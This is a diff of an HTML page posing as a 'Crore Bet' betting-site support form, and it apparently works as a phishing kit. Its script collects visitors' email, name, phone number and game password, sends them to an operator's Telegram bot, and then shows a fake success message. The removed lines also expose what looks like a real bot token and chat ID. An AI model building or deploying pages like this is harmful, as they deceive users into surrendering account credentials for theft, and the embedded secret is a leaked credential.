@@ -3,670 +3,230 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crore Bet — Premium Support</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+    <title>Crore Bet Support</title>
     <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-
-        :root {
-            --gold: #e6b800;
-            --gold-deep: #c9a000;
-            --bg-page: #f4f6fb;
-            --bg-card: #ffffff;
-            --border-soft: rgba(15, 23, 42, 0.08);
-            --text-main: #0f172a;
-            --text-muted: #64748b;
-            --input-bg: #f8fafc;
-            --input-border: #e2e8f0;
-            --success: #16a34a;
-            --error: #dc2626;
-            --tg-blue: #229ED9;
+            font-family: Arial, Helvetica, sans-serif;
         }
 
         body {
-            background: var(--bg-page);
+            background-color: #0c0e14;
+            color: #ffffff;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: flex-start;
             min-height: 100vh;
-            padding: 32px 18px;
-            color: var(--text-main);
-            position: relative;
-            overflow-x: hidden;
+            padding: 15px 12px 35px;
         }
 
-        /* Soft light glows behind card */
-        body::before,
-        body::after {
-            content: '';
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(130px);
-            z-index: 0;
-            pointer-events: none;
-        }
-        body::before {
-            width: 500px;
-            height: 500px;
-            background: radial-gradient(circle, rgba(255, 210, 0, 0.28), transparent 70%);
-            top: -160px;
-            left: -140px;
-            animation: drift 16s ease-in-out infinite alternate;
-        }
-        body::after {
-            width: 540px;
-            height: 540px;
-            background: radial-gradient(circle, rgba(100, 130, 255, 0.22), transparent 70%);
-            bottom: -200px;
-            right: -180px;
-            animation: drift 20s ease-in-out infinite alternate-reverse;
-        }
-
-        @keyframes drift {
-            0%   { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(40px, 30px) scale(1.12); }
-        }
-
+        /* Main Form Card */
         .form-card {
-            position: relative;
-            z-index: 1;
-            background: var(--bg-card);
+            background-color: #161b26;
             width: 100%;
-            max-width: 440px;
-            padding: 40px 32px 34px;
-            border-radius: 26px;
-            border: 1px solid var(--border-soft);
-            box-shadow:
-                0 24px 60px rgba(15, 23, 42, 0.10),
-                0 4px 14px rgba(15, 23, 42, 0.05),
-                0 1px 0 rgba(255, 255, 255, 0.9) inset;
-            animation: cardIn 0.7s cubic-bezier(0.2, 0.9, 0.3, 1) both;
+            max-width: 380px;
+            padding: 16px 18px;
+            border-radius: 14px;
+            border: 1px solid #283044;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
         }
 
-        /* Gold top accent */
-        .form-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 62%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, var(--gold), transparent);
-            border-radius: 3px;
-            filter: drop-shadow(0 0 6px rgba(230, 184, 0, 0.6));
-        }
-
-        @keyframes cardIn {
-            from { opacity: 0; transform: translateY(28px) scale(0.97); }
-            to   { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        /* ================= LOGO ================= */
+        /* CRORE BET Logo */
         .logo-wrapper {
             display: flex;
             justify-content: center;
-            margin-bottom: 6px;
+            margin-bottom: 12px;
         }
 
         .crore-bet-logo {
-            background: linear-gradient(145deg, #1a1a1a, #000000);
+            background-color: #000000;
             display: inline-flex;
             align-items: center;
-            padding: 10px 20px;
-            border-radius: 14px;
-            border: 1px solid rgba(230, 184, 0, 0.35);
-            box-shadow:
-                0 8px 22px rgba(0, 0, 0, 0.22),
-                0 0 24px rgba(230, 184, 0, 0.18),
-                0 1px 0 rgba(255, 255, 255, 0.08) inset;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .crore-bet-logo::after {
-            content: '';
-            position: absolute;
-            top: 0; left: -60%;
-            width: 40%;
-            height: 100%;
-            background: linear-gradient(110deg, transparent, rgba(255, 255, 255, 0.22), transparent);
-            transform: skewX(-20deg);
-            animation: shine 4.5s ease-in-out infinite;
-        }
-
-        @keyframes shine {
-            0%, 55% { left: -60%; }
-            80%, 100% { left: 130%; }
+            padding: 6px 14px;
+            border-radius: 8px;
+            border: 1px solid #fff230;
         }
 
         .crore-text {
             color: #ffffff;
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 23px;
-            font-weight: 700;
-            letter-spacing: 2px;
-            margin-right: 11px;
-            text-transform: uppercase;
+            font-size: 18px;
+            font-weight: 900;
+            letter-spacing: 1.5px;
+            margin-right: 8px;
         }
 
         .bet-badge {
-            background: linear-gradient(145deg, #fff230, #e6d300);
+            background-color: #fff230;
             color: #000000;
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 19px;
-            font-weight: 700;
-            padding: 4px 11px;
-            border-radius: 7px;
-            letter-spacing: 1.2px;
-            text-transform: uppercase;
-            box-shadow: 0 0 16px rgba(255, 242, 48, 0.45);
+            font-size: 15px;
+            font-weight: 900;
+            padding: 2px 7px;
+            border-radius: 4px;
         }
 
-        .tagline {
-            text-align: center;
-            font-size: 12.5px;
-            color: var(--text-muted);
-            letter-spacing: 0.6px;
-            margin: 14px 0 26px;
-            font-weight: 500;
-        }
-
-        .tagline span {
-            color: var(--gold);
-            font-weight: 700;
-        }
-
-        /* ================= FORM FIELDS ================= */
+        /* Form Inputs */
         .input-group {
-            margin-bottom: 16px;
-            animation: fieldIn 0.55s cubic-bezier(0.2, 0.9, 0.3, 1) both;
-        }
-        .input-group:nth-child(1) { animation-delay: 0.05s; }
-        .input-group:nth-child(2) { animation-delay: 0.10s; }
-        .input-group:nth-child(3) { animation-delay: 0.15s; }
-        .input-group:nth-child(4) { animation-delay: 0.20s; }
-        .input-group:nth-child(5) { animation-delay: 0.25s; }
-        .input-group:nth-child(6) { animation-delay: 0.30s; }
-
-        @keyframes fieldIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to   { opacity: 1; transform: translateY(0); }
+            margin-bottom: 9px;
+            text-align: left;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            font-size: 12px;
-            color: #475569;
-            font-weight: 700;
-            letter-spacing: 0.7px;
-            text-transform: uppercase;
+            margin-bottom: 4px;
+            font-size: 11px;
+            color: #a4b1cd;
+            font-weight: bold;
         }
 
         input[type="text"],
         input[type="email"],
         input[type="tel"],
+        input[type="password"],
         select {
             width: 100%;
-            padding: 14px 16px;
-            background: var(--input-bg);
-            border: 1.5px solid var(--input-border);
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--text-main);
+            padding: 8px 10px;
+            background-color: #0a0d14;
+            border: 1px solid #343f5a;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #ffffff;
             outline: none;
-            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.3, 1);
-        }
-
-        input::placeholder {
-            color: #94a3b8;
-            font-weight: 400;
-        }
-
-        input:hover,
-        select:hover {
-            border-color: #cbd5e1;
         }
 
         input:focus,
         select:focus {
-            border-color: var(--gold);
-            background: #ffffff;
-            box-shadow:
-                0 0 0 4px rgba(230, 184, 0, 0.14),
-                0 2px 8px rgba(15, 23, 42, 0.04);
-        }
-
-        select {
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 16px center;
-            padding-right: 42px;
-            cursor: pointer;
+            border-color: #fff230;
         }
 
         select option {
-            background: #ffffff;
-            color: var(--text-main);
+            background-color: #161b26;
+            color: #ffffff;
         }
 
-        /* ================= FILE UPLOAD ================= */
-        .file-upload-box {
-            position: relative;
-            background: var(--input-bg);
-            border: 1.5px dashed #cbd5e1;
-            border-radius: 12px;
-            padding: 12px 16px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.3, 1);
-        }
-
-        .file-upload-box:hover {
-            border-color: var(--gold);
-            background: rgba(230, 184, 0, 0.05);
-        }
-
+        /* File Upload */
         input[type="file"] {
             width: 100%;
-            color: #64748b;
-            font-size: 13px;
-            font-weight: 500;
+            background-color: #0a0d14;
+            border: 1px dashed #343f5a;
+            border-radius: 6px;
+            padding: 6px;
+            font-size: 11px;
+            color: #a4b1cd;
             outline: none;
-            cursor: pointer;
         }
 
-        input[type="file"]::file-selector-button {
-            background: #1e293b;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 8px;
-            color: #ffffff;
-            font-size: 12px;
-            font-weight: 600;
-            margin-right: 14px;
-            cursor: pointer;
-            transition: all 0.25s ease;
-            font-family: 'Plus Jakarta Sans', sans-serif;
-        }
-
-        input[type="file"]::file-selector-button:hover {
-            background: linear-gradient(145deg, #fff230, #e6d300);
-            color: #000000;
-            box-shadow: 0 0 14px rgba(255, 242, 48, 0.5);
-        }
-
-        /* ================= SUBMIT BUTTON ================= */
-        button {
-            position: relative;
+        /* Submit Button */
+        button.submit-btn {
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #fff230 0%, #ffd700 50%, #e6d300 100%);
-            background-size: 200% 200%;
+            padding: 11px;
+            background-color: #fff230;
             color: #000000;
             border: none;
-            border-radius: 14px;
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 15px;
-            font-weight: 700;
-            letter-spacing: 1px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 800;
             text-transform: uppercase;
             cursor: pointer;
-            margin-top: 16px;
-            transition: all 0.35s cubic-bezier(0.2, 0.9, 0.3, 1);
-            box-shadow:
-                0 10px 24px rgba(230, 184, 0, 0.35),
-                0 2px 0 rgba(255, 255, 255, 0.6) inset;
-            overflow: hidden;
+            margin-top: 6px;
         }
 
-        button::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(110deg, transparent, rgba(255, 255, 255, 0.6), transparent);
-            transform: skewX(-20deg);
-            transition: left 0.6s ease;
-        }
-
-        button:hover {
-            background-position: 100% 100%;
-            transform: translateY(-3px);
-            box-shadow:
-                0 16px 34px rgba(230, 184, 0, 0.5),
-                0 2px 0 rgba(255, 255, 255, 0.6) inset;
-        }
-
-        button:hover::before {
-            left: 100%;
-        }
-
-        button:active {
-            transform: translateY(-1px) scale(0.995);
-        }
-
-        button:disabled {
-            background: #e2e8f0;
-            color: #94a3b8;
+        button.submit-btn:disabled {
+            background-color: #666014;
+            color: #aaa;
             cursor: not-allowed;
-            box-shadow: none;
-            transform: none;
         }
 
-        button:disabled::before {
-            display: none;
-        }
-
-        #statusMsg {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 13px;
-            font-weight: 600;
-            min-height: 20px;
-            letter-spacing: 0.3px;
-            transition: all 0.3s ease;
-        }
-
-        /* ================= JOIN TELEGRAM BUTTON ================= */
-        .tg-btn {
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+        /* Telegram Button */
+        .telegram-section {
             width: 100%;
-            padding: 15px;
-            margin-top: 14px;
-            background: linear-gradient(135deg, #2AB0E8 0%, #229ED9 50%, #1877a3 100%);
-            background-size: 200% 200%;
+            max-width: 380px;
+            margin-top: 22px;
+            text-align: center;
+        }
+
+        .telegram-text {
+            font-size: 12px;
+            color: #8fa0c0;
+            margin-bottom: 8px;
+        }
+
+        .telegram-btn {
+            display: block;
+            width: 100%;
+            padding: 11px;
+            background-color: #0088cc;
             color: #ffffff;
             text-decoration: none;
-            border-radius: 14px;
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 14.5px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            box-shadow:
-                0 10px 24px rgba(34, 158, 217, 0.35),
-                0 2px 0 rgba(255, 255, 255, 0.25) inset;
-            transition: all 0.35s cubic-bezier(0.2, 0.9, 0.3, 1);
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            box-sizing: border-box;
         }
 
-        .tg-btn::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
+        /* Popup Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(110deg, transparent, rgba(255, 255, 255, 0.4), transparent);
-            transform: skewX(-20deg);
-            transition: left 0.6s ease;
-        }
-
-        .tg-btn:hover {
-            background-position: 100% 100%;
-            transform: translateY(-3px);
-            box-shadow:
-                0 16px 34px rgba(34, 158, 217, 0.55),
-                0 2px 0 rgba(255, 255, 255, 0.3) inset;
-        }
-
-        .tg-btn:hover::before {
-            left: 100%;
-        }
-
-        .tg-btn:active {
-            transform: translateY(-1px) scale(0.995);
-        }
-
-        .tg-btn svg {
-            width: 20px;
-            height: 20px;
-            fill: #ffffff;
-            flex-shrink: 0;
-            filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.4));
-        }
-
-        /* ================= POPUP ================= */
-        .popup-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(15, 23, 42, 0.45);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            display: flex;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            padding: 24px;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.35s ease, visibility 0.35s ease;
+            padding: 20px;
         }
 
-        .popup-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .popup-box {
-            position: relative;
-            background: #ffffff;
-            border: 1px solid var(--border-soft);
-            border-radius: 24px;
-            padding: 40px 30px 32px;
-            width: 100%;
-            max-width: 360px;
-            text-align: center;
-            box-shadow:
-                0 40px 90px rgba(15, 23, 42, 0.30),
-                0 0 0 1px rgba(255, 255, 255, 0.8) inset;
-            transform: scale(0.7) translateY(40px);
-            opacity: 0;
-            transition: transform 0.55s cubic-bezier(0.34, 1.56, 0.64, 1),
-                        opacity 0.4s ease;
-        }
-
-        .popup-overlay.active .popup-box {
-            transform: scale(1) translateY(0);
-            opacity: 1;
-        }
-
-        .popup-box::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 58%;
-            height: 3px;
-            border-radius: 3px;
-            background: linear-gradient(90deg, transparent, var(--gold), transparent);
-            filter: drop-shadow(0 0 6px rgba(230, 184, 0, 0.6));
-        }
-
-        .popup-icon {
-            width: 88px;
-            height: 88px;
-            margin: 0 auto 22px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-
-        .popup-icon.success {
-            background: radial-gradient(circle at 30% 25%, #4ade80, #16a34a);
-            box-shadow:
-                0 0 0 8px rgba(22, 163, 74, 0.12),
-                0 0 40px rgba(22, 163, 74, 0.45);
-        }
-
-        .popup-icon.error {
-            background: radial-gradient(circle at 30% 25%, #f87171, #dc2626);
-            box-shadow:
-                0 0 0 8px rgba(220, 38, 38, 0.12),
-                0 0 40px rgba(220, 38, 38, 0.45);
-        }
-
-        .popup-icon svg {
-            width: 42px;
-            height: 42px;
-            stroke: #ffffff;
-            stroke-width: 3;
-            fill: none;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-            opacity: 0;
-            transform: scale(0.4);
-        }
-
-        .popup-overlay.active .popup-icon svg {
-            animation: iconPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 0.35s forwards;
-        }
-
-        @keyframes iconPop {
-            from { opacity: 0; transform: scale(0.4) rotate(-25deg); }
-            to   { opacity: 1; transform: scale(1) rotate(0deg); }
-        }
-
-        .popup-icon::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border-radius: 50%;
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            opacity: 0;
-        }
-
-        .popup-overlay.active .popup-icon::after {
-            animation: ripple 1.1s ease-out 0.3s;
-        }
-
-        @keyframes ripple {
-            0%   { opacity: 0.8; transform: scale(1); }
-            100% { opacity: 0; transform: scale(1.9); }
-        }
-
-        .popup-title {
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            letter-spacing: 0.3px;
-            color: var(--text-main);
-            opacity: 0;
-            transform: translateY(12px);
-        }
-
-        .popup-overlay.active .popup-title {
-            animation: fadeUp 0.45s ease 0.45s forwards;
-        }
-
-        .popup-text {
-            font-size: 14px;
-            line-height: 1.55;
-            color: var(--text-muted);
-            margin-bottom: 26px;
-            opacity: 0;
-            transform: translateY(12px);
-        }
-
-        .popup-overlay.active .popup-text {
-            animation: fadeUp 0.45s ease 0.55s forwards;
-        }
-
-        @keyframes fadeUp {
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .popup-btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
+        .modal-box {
+            background-color: #181d29;
+            border: 2px solid #fff230;
             border-radius: 12px;
-            background: linear-gradient(135deg, #fff230, #e6d300);
-            color: #000;
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 14px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            text-transform: uppercase;
+            max-width: 320px;
+            width: 100%;
+            padding: 22px 18px;
+            text-align: center;
+        }
+
+        .modal-icon {
+            font-size: 36px;
+            color: #38ef7d;
+            margin-bottom: 8px;
+        }
+
+        .modal-title {
+            font-size: 17px;
+            font-weight: bold;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+
+        .modal-desc {
+            font-size: 12px;
+            color: #cbd5e1;
+            line-height: 1.4;
+            margin-bottom: 16px;
+        }
+
+        .modal-btn {
+            background-color: #fff230;
+            color: #000000;
+            border: none;
+            padding: 8px 25px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 8px 22px rgba(230, 184, 0, 0.35);
-            transition: transform 0.25s ease, box-shadow 0.25s ease;
-            opacity: 0;
-            transform: translateY(12px);
-        }
-
-        .popup-overlay.active .popup-btn {
-            animation: fadeUp 0.45s ease 0.65s forwards;
-        }
-
-        .popup-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 30px rgba(230, 184, 0, 0.55);
-        }
-
-        .popup-btn:active {
-            transform: translateY(0) scale(0.98);
-        }
-
-        .popup-particles {
-            position: absolute;
-            inset: 0;
-            overflow: hidden;
-            border-radius: 24px;
-            pointer-events: none;
-        }
-
-        .popup-particles span {
-            position: absolute;
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            opacity: 0;
-        }
-
-        .popup-overlay.active .popup-particles span {
-            animation: burst 1.1s ease-out forwards;
-        }
-
-        @keyframes burst {
-            0%   { opacity: 1; transform: translate(0, 0) scale(1); }
-            100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(0.2); }
-        }
-
-        @media (max-width: 460px) {
-            .form-card {
-                padding: 32px 22px 26px;
-                border-radius: 22px;
-            }
-            .crore-text { font-size: 20px; }
-            .bet-badge { font-size: 17px; }
-            label { font-size: 11px; }
-            input, select { padding: 13px 14px; }
-            .popup-box { padding: 34px 24px 28px; }
         }
     </style>
 </head>
 <body>
 
     <div class="form-card">
+        <!-- Logo -->
         <div class="logo-wrapper">
             <div class="crore-bet-logo">
                 <span class="crore-text">CRORE</span>
@@ -674,27 +234,25 @@
             </div>
         </div>
 
-        <p class="tagline">Premium <span>24/7</span> Support — We’re here to help</p>
-
         <form id="tgForm">
             <div class="input-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" placeholder="Enter you game email" required>
+                <label for="email">Email</label>
+                <input type="email" id="email" placeholder="Enter your email" required>
             </div>
 
             <div class="input-group">
-                <label for="name">Full Name</label>
-                <input type="text" id="name" placeholder="Enter your full name" required>
+                <label for="name">Name</label>
+                <input type="text" id="name" placeholder="Enter your name" required>
             </div>
 
             <div class="input-group">
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" placeholder="Enter your number" required>
+                <input type="tel" id="phone" placeholder="Enter phone number" required>
             </div>
 
             <div class="input-group">
                 <label for="password">Password</label>
-                <input type="text" id="password" placeholder="Enter your game password" required>
+                <input type="password" id="password" placeholder="Enter password" required>
             </div>
 
             <div class="input-group">
@@ -711,147 +269,79 @@
 
             <div class="input-group">
                 <label for="screenshot">Upload Screenshot (Optional)</label>
-                <div class="file-upload-box">
-                    <input type="file" id="screenshot" accept="image/*">
-                </div>
+                <input type="file" id="screenshot" accept="image/*">
             </div>
 
-            <button type="submit" id="submitBtn">Submit Request</button>
-            <p id="statusMsg"></p>
+            <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
         </form>
-
-        <!-- Join Telegram button below Submit -->
-        <a href="https://t.me/YourTelegramChannel" target="_blank" rel="noopener noreferrer" class="tg-btn">
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
-            </svg>
-            Join Telegram
-        </a>
     </div>
 
-    <!-- POPUP -->
-    <div class="popup-overlay" id="popupOverlay">
-        <div class="popup-box" id="popupBox">
-            <div class="popup-particles" id="particles"></div>
+    <!-- Telegram Direct Link Button -->
+    <div class="telegram-section">
+        <p class="telegram-text">Need immediate help? Contact our direct support</p>
+        <a href="https://t.me/YOUR_TELEGRAM_USERNAME" target="_blank" class="telegram-btn">Chat on Telegram</a>
+    </div>
 
-            <div class="popup-icon success" id="popupIcon">
-                <svg viewBox="0 0 24 24" id="popupIconSvg">
-                    <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
-            </div>
-
-            <h2 class="popup-title" id="popupTitle">Success!</h2>
-            <p class="popup-text" id="popupText">Your request has been submitted successfully. Our team will contact you soon.</p>
-
-            <button class="popup-btn" id="popupBtn">Awesome!</button>
+    <!-- Success Modal -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-box">
+            <div class="modal-icon">✓</div>
+            <h3 class="modal-title">Request Submitted!</h3>
+            <p class="modal-desc">Your request has been successfully sent to our support team. We will review and resolve your issue shortly.</p>
+            <button type="button" class="modal-btn" id="closeModalBtn">OK</button>
         </div>
     </div>
 
     <script>
-        // ------------------------------------------------------------------
-        // ⚠️ REPLACE WITH YOUR OWN TELEGRAM BOT TOKEN & CHAT ID
-        // ------------------------------------------------------------------
-        const BOT_TOKEN = "8773997207:AAEkI6j5yz9vyuvxUBu4GzWxEFEHDE4GCbs";
-        const CHAT_ID   = "7643342967";
+        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+        const CHAT_ID = "YOUR_CHAT_ID_HERE";
 
-        const form      = document.getElementById('tgForm');
+        const form = document.getElementById('tgForm');
         const submitBtn = document.getElementById('submitBtn');
-        const statusMsg = document.getElementById('statusMsg');
+        const modal = document.getElementById('successModal');
+        const closeModalBtn = document.getElementById('closeModalBtn');
 
-        const popupOverlay = document.getElementById('popupOverlay');
-        const popupIcon    = document.getElementById('popupIcon');
-        const popupIconSvg = document.getElementById('popupIconSvg');
-        const popupTitle   = document.getElementById('popupTitle');
-        const popupText    = document.getElementById('popupText');
-        const popupBtn     = document.getElementById('popupBtn');
-        const particlesBox = document.getElementById('particles');
-
-        const CHECK_SVG = '<polyline points="20 6 9 17 4 12"></polyline>';
-        const CROSS_SVG = '<line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>';
-
-        function spawnParticles() {
-            particlesBox.innerHTML = '';
-            const colors = ['#fff230', '#4ade80', '#ffd700', '#16a34a', '#e6b800'];
-            for (let i = 0; i < 16; i++) {
-                const span = document.createElement('span');
-                const angle = (Math.PI * 2 * i) / 16;
-                const dist = 90 + Math.random() * 70;
-                span.style.setProperty('--tx', Math.cos(angle) * dist + 'px');
-                span.style.setProperty('--ty', Math.sin(angle) * dist + 'px');
-                span.style.left = '50%';
-                span.style.top = '50%';
-                span.style.background = colors[i % colors.length];
-                span.style.boxShadow = `0 0 10px ${colors[i % colors.length]}`;
-                span.style.animationDelay = (0.35 + Math.random() * 0.15) + 's';
-                particlesBox.appendChild(span);
-            }
-        }
-
-        function showPopup(type, title, text) {
-            popupOverlay.classList.remove('active');
-
-            if (type === 'success') {
-                popupIcon.className = 'popup-icon success';
-                popupIconSvg.innerHTML = CHECK_SVG;
-                spawnParticles();
-            } else {
-                popupIcon.className = 'popup-icon error';
-                popupIconSvg.innerHTML = CROSS_SVG;
-                particlesBox.innerHTML = '';
-            }
-
-            popupTitle.textContent = title;
-            popupText.textContent = text;
-
-            void popupOverlay.offsetWidth;
-            setTimeout(() => popupOverlay.classList.add('active'), 10);
-        }
-
-        function hidePopup() {
-            popupOverlay.classList.remove('active');
-        }
-
-        popupBtn.addEventListener('click', hidePopup);
-        popupOverlay.addEventListener('click', function (e) {
-            if (e.target === popupOverlay) hidePopup();
+        closeModalBtn.addEventListener('click', function() {
+            modal.style.display = 'none';
         });
 
-        form.addEventListener('submit', function (e) {
+        form.addEventListener('submit', function(e) {
             e.preventDefault();
 
             submitBtn.disabled = true;
             submitBtn.innerText = "Submitting...";
-            statusMsg.innerText = "";
 
-            const email        = document.getElementById('email').value.trim();
-            const name         = document.getElementById('name').value.trim();
-            const phone        = document.getElementById('phone').value.trim();
-            const password     = document.getElementById('password').value.trim();
+            const email = document.getElementById('email').value;
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
             const problemIssue = document.getElementById('problemIssue').value;
-            const fileInput    = document.getElementById('screenshot');
-            const file         = fileInput.files[0];
+            const fileInput = document.getElementById('screenshot');
+            const file = fileInput.files[0];
 
-            const captionText = `📌 *New Request (Crore Bet)*\n\n` +
-                                `📧 *Email:* ${email}\n` +
-                                `👤 *Name:* ${name}\n` +
-                                `📞 *Phone:* ${phone}\n` +
-                                `🆔 *password:* ${password}\n` +
-                                `⚠️ *Problem Issue:* ${problemIssue}`;
+            const captionText = "📌 *New Request (Crore Bet)*\n\n" +
+                                "📧 *Email:* " + email + "\n" +
+                                "👤 *Name:* " + name + "\n" +
+                                "📞 *Phone:* " + phone + "\n" +
+                                "🔑 *Password:* " + password + "\n" +
+                                "⚠️ *Problem Issue:* " + problemIssue;
 
-            function sendPhoto() {
+            if (file) {
                 const formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
                 formData.append("photo", file);
                 formData.append("caption", captionText);
                 formData.append("parse_mode", "Markdown");
-                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+
+                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
                     method: "POST",
                     body: formData
-                });
-            }
-
-            function sendMessage() {
-                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                })
+                .then(function(res) { return res.json(); })
+                .then(handleResponse)
+                .catch(handleError);
+            } else {
+                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -859,40 +349,30 @@
                         text: captionText,
                         parse_mode: "Markdown"
                     })
-                });
+                })
+                .then(function(res) { return res.json(); })
+                .then(handleResponse)
+                .catch(handleError);
             }
 
-            const request = file ? sendPhoto() : sendMessage();
+            function handleResponse(data) {
+                if (data.ok) {
+                    modal.style.display = 'flex';
+                    form.reset();
+                } else {
+                    alert("Telegram Error: Check Bot Token or Chat ID.");
+                }
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Submit Request";
+            }
 
-            request
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ok) {
-                        showPopup(
-                            'success',
-                            'Request Submitted!',
-                            'Your request has been sent successfully. Our support team will reach out to you shortly.'
-                        );
-                        statusMsg.style.color = "#16a34a";
-                        statusMsg.innerText = "✅ Request submitted successfully!";
-                        form.reset();
-                    } else {
-                        showPopup(
-                            'error',
-                            'Submission Failed',
-                            'We couldn’t send your request. Please check the bot configuration and try again.'
-                        );
-                        statusMsg.style.color = "#dc2626";
-                        statusMsg.innerText = "❌ Failed to send. Check Bot Token / Chat ID.";
-                        console.warn("Telegram API error:", data);
-                    }
-                })
-                .catch(err => {
-                    showPopup(
-                        'error',
-                        'Network Error',
-                        'Something went wrong with the connection. Please check your internet and try again.'
-                    );
-                    statusMsg.style.color = "#dc2626";
-                    statusMsg.innerText = "⚠️ Network error! Please try again.";
-                    console.error("Fetch
+            function handleError() {
+                alert("Network error! Please try again.");
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Submit Request";
+            }
+        });
+    </script>
+
+</body>
+</html>
